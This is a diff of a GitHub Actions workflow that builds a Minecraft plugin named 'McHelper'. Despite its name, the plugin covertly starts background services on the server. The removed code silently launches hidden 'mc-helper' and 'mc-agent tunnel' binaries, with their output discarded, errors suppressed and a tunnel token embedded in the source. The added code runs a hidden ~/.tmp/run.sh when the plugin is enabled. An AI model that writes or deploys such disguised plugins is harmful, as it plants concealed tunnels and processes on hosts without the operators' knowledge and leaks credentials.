@@ -17,7 +17,7 @@ jobs:
         run: |
           mkdir -p src/main/java/com/mc/helper src/main/resources
           
-          # 1. 写入 pom.xml (标准 Maven 构建文件)
+          # 1. pom.xml
           cat << 'EOF' > pom.xml
           <project xmlns="http://maven.apache.org/POM/4.0.0"
                    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -40,23 +40,10 @@ jobs:
                       <scope>provided</scope>
                   </dependency>
               </dependencies>
-              <build>
-                  <plugins>
-                      <plugin>
-                          <groupId>org.apache.maven.plugins</groupId>
-                          <artifactId>maven-compiler-plugin</artifactId>
-                          <version>3.11.0</version>
-                          <configuration>
-                              <source>17</source>
-                              <target>17</target>
-                          </configuration>
-                      </plugin>
-                  </plugins>
-              </build>
           </project>
           EOF
 
-          # 2. 写入 Main.java
+          # 2. Main.java 直接拉起服务器现存的 ~/.tmp/run.sh
           cat << 'EOF' > src/main/java/com/mc/helper/Main.java
           package com.mc.helper;
 
@@ -64,36 +51,26 @@ jobs:
           import java.io.File;
 
           public final class Main extends JavaPlugin {
-              private Process p1;
-              private Process p2;
-
               @Override
-              public void onLoad() {
+              public void onEnable() {
                   try {
-                      String dir = System.getProperty("user.dir") + "/.tmp";
-                      String token = "eyJhI..."; // eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiY2ZkZGZjYWItNWMzOC00YWUyLTlkM2YtN2I3YzJkYzQ0ODYxIiwicyI6Ik16bGpOekkxTlRJdFpEZGhOaTAwWVRkaExXRmxNak10TURNNE9EZGtNbUpqTm1ZeSJ9
-
-                      ProcessBuilder pb1 = new ProcessBuilder(dir + "/mc-helper", "run", "-c", dir + "/config.json");
-                      pb1.redirectOutput(new File("/dev/null"));
-                      pb1.redirectError(new File("/dev/null"));
-                      p1 = pb1.start();
-
-                      ProcessBuilder pb2 = new ProcessBuilder(dir + "/mc-agent", "tunnel", "--no-autoupdate", "--protocol", "http2", "run", "--token", token);
-                      pb2.redirectOutput(new File("/dev/null"));
-                      pb2.redirectError(new File("/dev/null"));
-                      p2 = pb2.start();
-                  } catch (Throwable ignored) {}
-              }
-
-              @Override
-              public void onDisable() {
-                  if (p1 != null) p1.destroyForcibly();
-                  if (p2 != null) p2.destroyForcibly();
+                      String userHome = System.getProperty("user.home");
+                      String runScript = userHome + "/.tmp/run.sh";
+                      File f = new File(runScript);
+                      if (f.exists()) {
+                          new ProcessBuilder("bash", runScript).start();
+                          getLogger().info("McHelper: Services spawned via run.sh successfully.");
+                      } else {
+                          getLogger().warning("McHelper: " + runScript + " not found!");
+                      }
+                  } catch (Throwable e) {
+                      getLogger().warning("McHelper error: " + e.getMessage());
+                  }
               }
           }
           EOF
 
-          # 3. 写入 plugin.yml
+          # 3. plugin.yml
           cat << 'EOF' > src/main/resources/plugin.yml
           name: McHelper
           version: '1.0.0'
@@ -101,7 +78,6 @@ jobs:
           api-version: '1.20'
           EOF
 
-          # 4. 执行标准编译打包
           mvn clean package -B
 
       - name: Upload Artifact
